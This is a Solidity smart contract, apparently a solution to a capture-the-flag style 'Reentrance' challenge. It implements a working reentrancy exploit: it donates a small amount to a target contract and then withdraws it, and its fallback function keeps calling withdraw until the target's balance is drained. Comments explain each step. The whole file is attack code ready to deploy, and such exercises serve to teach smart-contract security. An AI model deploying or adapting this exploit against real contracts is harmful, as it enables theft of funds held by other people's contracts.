// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import './Reentrance.sol';

contract ReentrancyAttack{

    Reentrance instance;

    // In here we create an instance of the contract so we can call its functions.
    constructor(address payable _reentranceAddress) public {
        instance = Reentrance(_reentranceAddress);
    }

    // This is the trigger. First the contract checks that we are sending the minimum value.
    // Then it transfers that amount to the attacked vulnerable contract.
    // After it transfers the tokens, it withdraws them back again.
    // That withdraw call produces an inlet of tokens to this contract. That inlet triggers the fallback payable function.
    function attack() public payable {
        require(msg.value >= 1000000000000000 wei);
        instance.donate{value: 1000000000000000 wei}(address(this));
        instance.withdraw(1000000000000000);
    }

    // This function is triggered the first time the attacked contract sends tokens to this contract.
    // Although a balance grater than zero can be checked, it may cause gas issues. If the contract A has 
    // a balance greater than the checked, the withdraw function is called again and that causes a loop over this 
    // fallback function until the if statement is not satisfied anymore.
    // This logic will drain the tokens of the exploited contract. 
    fallback() external payable{
        if(address(instance).balance >= 1000000000000000 wei){
            instance.withdraw(1000000000000000);
        }
    }
}